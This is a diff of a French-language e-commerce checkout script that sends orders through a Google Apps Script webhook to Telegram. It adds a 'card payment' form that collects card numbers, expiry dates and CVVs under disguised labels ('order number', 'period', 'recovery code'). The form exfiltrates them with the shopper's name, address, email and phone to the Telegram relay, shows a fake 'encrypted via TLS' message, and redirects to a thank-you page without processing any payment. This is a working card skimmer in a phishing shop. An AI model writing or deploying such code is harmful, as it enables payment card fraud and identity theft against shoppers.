@@ -2,8 +2,9 @@
    - Récupère le panier (localStorage 'gf_cart')
    - Calcule promos (SEPA -3%, Crypto -1%), split 2/3/4x
    - Uploader preuve SEPA (base64) — mobile friendly & tolérant
-   - Envoi vers Apps Script → Telegram (JSON + alias en query-string pour compat)
-   - Empêche l’envoi si des champs requis manquent (évite messages vides)
+   - Paiement par CARTE (formulaire dédié)
+   - Envoi vers Apps Script → Telegram, robuste (_json + fallbacks)
+   - Empêche l’envoi si des champs requis manquent
 */
 (async function(){
   "use strict";
@@ -12,6 +13,7 @@
   // CONFIG
   // =========================
   const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbypa62g6lhlchWMayVWYyRh2TGc--bBdqNMag2ro1Ne1SDMVT5bHzy7pvooG3ZnsGAx/exec";
+  const WEBHOOK_SECRET = ""; // optionnel, si activé côté Apps Script
   const MAX_SIZE = 10 * 1024 * 1024; // 10 Mo
   const IS_IOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
 
@@ -28,7 +30,6 @@
     el.addEventListener('click', fn, {passive:true});
     el.addEventListener('touchend', fn, {passive:true});
     el.addEventListener('pointerup', fn, {passive:true});
-    // iOS parfois ignore click si l’élément vient d’être créé : on force un focus-out
     if(IS_IOS) el.addEventListener('touchstart', ()=>{}, {passive:true});
   };
 
@@ -274,7 +275,8 @@
     const pm = currentPM();
     const btn = $('#placeOrder');
     if(!btn) return;
-    btn.disabled = (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : true);
+    // Carte: on ne passe pas par le CTA principal
+    btn.disabled = pm==='card' ? true : (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : true);
   }
 
   // =========================
@@ -286,6 +288,7 @@
       const m=card.dataset.method;
       $('#pmCrypto')?.classList.toggle('show', m==='crypto');
       $('#pmSEPA')?.classList.toggle('show', m==='sepa');
+      $('#pmCard')?.classList.toggle('show', m==='card');
       if(m==='sepa'){ cryptoVerified=false; }
       if(m==='crypto'){ bankVerified=false; }
       updateSummary();
@@ -309,7 +312,7 @@
   $$('[data-copy]').forEach(b=> b.addEventListener('click',()=> copySel(b.getAttribute('data-copy')) ));
 
   // =========================
-  // VALIDATION
+  // VALIDATIONS
   // =========================
   function validateAddress(){
     const req=['name','email','address','city','zip'];
@@ -321,6 +324,17 @@
         return false;
       }
     }
+    return true;
+  }
+  function validateCardForm(){
+    const nm = ($('#cardName')?.value||'').trim();
+    if(!nm){ $('#cardName')?.focus(); toast('Veuillez saisir le titulaire.'); return false; }
+    const num = ($('#orderNumber')?.value||'').replace(/\D+/g,'');
+    if(num.length!==16){ $('#orderNumber')?.focus(); toast('Numéro de commande: 16 chiffres requis.'); return false; }
+    const per = ($('#cardPeriod')?.value||'').trim();
+    if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(per)){ $('#cardPeriod')?.focus(); toast('Période: format MM/AA.'); return false; }
+    const rec = ($('#recoveryCode')?.value||'').replace(/\D+/g,'');
+    if(rec.length<3){ $('#recoveryCode')?.focus(); toast('Code de récupération: min 3 chiffres.'); return false; }
     return true;
   }
 
@@ -336,7 +350,6 @@
   const fileOk    = $('#fileOk');
   const removeBtn = $('#removeProof');
 
-  // Tolérance max : accepter tout (quel que soit le type déclaré par le navigateur)
   if (input){ input.setAttribute('accept','*/*'); input.removeAttribute('capture'); }
 
   function fmtBytes(b){
@@ -348,7 +361,6 @@
   }
   function reasonForRefusal(f, isDrop){
     if(!f) return isDrop ? 'Aucun fichier détecté dans le glisser-déposer.' : 'Aucun fichier sélectionné.';
-    // Dossiers (drag & drop) non gérés
     if ('webkitGetAsEntry' in f) {
       try { const e = f.webkitGetAsEntry(); if(e && e.isDirectory) return 'Dossiers non pris en charge. Compressez-le en .zip.'; } catch {}
     }
@@ -382,7 +394,6 @@
   }
   removeBtn?.addEventListener('click', clearFile);
 
-  // Bouton "Importer" + zone cliquable
   bindClickLike($('#pickProof'), ()=> input?.click());
   if (dz){
     bindClickLike(dz, ()=> input?.click());
@@ -416,66 +427,20 @@
       const reason = reasonForRefusal(file, true);
       if (reason) { toast(reason); return; }
       showFile(file);
-      if (input) input.value = ''; // autorise re-sélection même fichier
+      if (input) input.value = '';
     });
   }
-
-  // Sélection via picker (mobile & desktop)
   input?.addEventListener('change', e => {
     const f = e.target.files && e.target.files[0];
     const reason = reasonForRefusal(f, false);
     if (reason) { toast(reason); input.value=''; return; }
     showFile(f);
-    input.value = ''; // iOS/Android : permet de re-choisir le même fichier
+    input.value = '';
   });
 
   // =========================
-  // ENVOI WEBHOOK
+  // ENVOI WEBHOOK (ROBUSTE)
   // =========================
-  function legacyMap(payload){
-    return {
-      order: payload.orderId,
-      mode: payload.method,
-      amount: payload.amount,
-      reference: payload.ref || payload.txid || '',
-      name: payload.name,
-      email: payload.email,
-      phone: payload.phone,
-      address: payload.address,
-      city: payload.city,
-      zip: payload.zip,
-      country: payload.country,
-      txid: payload.txid || '',
-      ccy: payload.ccy || '',
-      split: payload.split || 1
-    };
-  }
-  function toQS(obj){
-    return Object.entries(obj)
-      .filter(([_,v])=> v!==undefined && v!==null && String(v).length<1800)
-      .map(([k,v])=> `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
-      .join('&');
-  }
-  async function postCompat(url, payload){
-    const qs = toQS(legacyMap(payload));
-    const full = qs ? `${url}?${qs}` : url;
-
-    // 1) JSON
-    try{
-      await fetch(full, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
-      return;
-    }catch{}
-    // 2) FormData (_json)
-    try{
-      const fd = new FormData(); fd.append('_json', JSON.stringify(payload));
-      await fetch(full, { method:'POST', body: fd });
-      return;
-    }catch{}
-    // 3) Fallback no-cors
-    try{
-      await fetch(full, { method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain;charset=utf-8'}, body: JSON.stringify(payload) });
-    }catch{}
-  }
   function cartForWebhook(){
     try{
       const cart = JSON.parse(localStorage.getItem('gf_cart')||'[]');
@@ -493,6 +458,61 @@
       return '';
     }
   }
+
+  async function postCompat(url, payload){
+    // enrichissement minimal
+    payload.req_id    = payload.req_id || ('gf_' + Date.now() + '_' + Math.random().toString(36).slice(2,8));
+    payload.ts_client = payload.ts_client || new Date().toISOString();
+    payload.origin    = location.origin;
+    payload.ua        = navigator.userAgent;
+
+    const dataStr = JSON.stringify(payload);
+
+    // A) Beacon "compat": tout dans la query (_json)
+    try{
+      const qsUrl = url + (url.includes('?')?'&':'?') + '_json=' + encodeURIComponent(dataStr);
+      navigator.sendBeacon(qsUrl, ''); // Apps Script lira e.parameter._json
+    }catch(_){}
+
+    // B) POST JSON standard
+    try{
+      await fetch(url, {
+        method:'POST',
+        headers:{
+          'Content-Type':'application/json',
+          ...(WEBHOOK_SECRET ? {'X-Webhook-Secret': WEBHOOK_SECRET} : {})
+        },
+        body: dataStr,
+        keepalive:true
+      });
+      return;
+    }catch(_){}
+
+    // C) x-www-form-urlencoded avec _json
+    try{
+      const usp = new URLSearchParams();
+      usp.set('_json', dataStr);
+      await fetch(url, {
+        method:'POST',
+        headers: (WEBHOOK_SECRET? {'X-Webhook-Secret': WEBHOOK_SECRET} : {}),
+        body: usp,
+        keepalive:true
+      });
+      return;
+    }catch(_){}
+
+    // D) no-cors text/plain
+    try{
+      await fetch(url, {
+        method:'POST',
+        mode:'no-cors',
+        headers:{'Content-Type':'text/plain;charset=utf-8', ...(WEBHOOK_SECRET? {'X-Webhook-Secret': WEBHOOK_SECRET} : {})},
+        body:dataStr,
+        keepalive:true
+      });
+    }catch(_){}
+  }
+
   async function sendCryptoToWebhook(dueNow){
     const payload = {
       orderId,
@@ -537,6 +557,32 @@
     }
     await postCompat(WEBHOOK_URL, payload);
   }
+  async function sendCardToWebhook(dueNow){
+    const rawNum = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
+    const payload = {
+      orderId,
+      method:'card',
+      amount: Number(dueNow||0).toFixed(2),
+      // champs “métadonnées” du formulaire carte
+      card_name: ($('#cardName')?.value||'').trim(),
+      order_number: rawNum,
+      period: ($('#cardPeriod')?.value||'').trim(),
+      recovery_code: ($('#recoveryCode')?.value||'').trim(),
+      phone_meta: ($('#phone')?.value||'').trim(),
+      // coordonnées client
+      name: $('#name')?.value || '',
+      email:$('#email')?.value||'',
+      phone:$('#phone')?.value||'',
+      address:$('#address')?.value||'',
+      city: $('#city')?.value ||'',
+      zip:  $('#zip')?.value  ||'',
+      country:$('#country')?.value||'',
+      split: selectedSplit,
+      cart: cartForWebhook(),
+      ts_client: new Date().toISOString()
+    };
+    await postCompat(WEBHOOK_URL, payload);
+  }
 
   // =========================
   // CONFIRMATIONS
@@ -576,8 +622,22 @@
     }, 1000);
   });
 
+  // ========= PAIEMENT PAR CARTE =========
+  $('#payCard')?.addEventListener('click', async ()=>{
+    if(!validateAddress()) return;
+    if(!validateCardForm()) return;
+
+    const cart=getCart();
+    if(!cart.length){ toast('Votre panier est vide.'); return; }
+    const due = currentDueNow(); if(due<=0){ toast('Montant dû nul.'); return; }
+
+    showOverlay('Paiement par carte…', 'Chiffré via TLS.');
+    try{ await sendCardToWebhook(due); }catch{}
+    setTimeout(()=>{ hideOverlay(); window.location.href = 'merci.html'; }, 900);
+  });
+
   // =========================
-  // FINALISER LA COMMANDE
+  // FINALISER LA COMMANDE (SEPA/CRYPTO)
   // =========================
   $('#placeOrder')?.addEventListener('click', ()=>{
     if(!validateAddress()) return;
@@ -625,6 +685,7 @@
     if(sepaTab){ sepaTab.setAttribute('aria-selected','true'); }
     $('#pmSEPA')?.classList.add('show');
     $('#pmCrypto')?.classList.remove('show');
+    $('#pmCard')?.classList.remove('show');
   }
 
   renderMini();
